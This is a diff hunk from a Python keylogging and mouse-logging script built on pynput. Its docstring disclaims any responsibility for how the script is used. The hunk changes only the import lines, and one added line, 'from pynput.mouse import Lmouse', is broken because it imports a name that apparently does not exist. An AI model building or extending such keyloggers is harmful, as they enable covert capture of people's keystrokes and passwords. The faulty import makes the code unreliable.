@@ -4,8 +4,8 @@ Advanced keylogging and mouse logging using the pynput library.
 DISCLAIMER :The creator of this script take no responsibility for any purposes regarding the usage of the script.
 """
 
-from pynput.keyboard import Key, Listener
-from pynput.mouse import Listener
+from pynput.keyboard import Key, Listener as Lkey
+from pynput.mouse import Lmouse
 
 import logging
 
